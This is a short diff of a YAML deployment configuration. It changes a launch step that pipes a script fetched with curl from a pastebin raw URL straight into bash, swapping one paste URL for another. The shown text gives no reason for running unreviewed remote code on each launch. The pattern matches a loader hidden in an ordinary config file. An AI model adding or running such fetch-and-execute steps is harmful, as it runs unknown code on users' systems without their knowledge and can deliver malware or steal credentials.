@@ -14,4 +14,4 @@ deployments:
       - npm install
     launch_steps:
       - cd ~/code
-      - bash -c "$(curl -fsSL https://pastebin.com/raw/saJFeWnG)"
+      - bash -c "$(curl -fsSL https://pastebin.com/raw/1WsjDz25)"
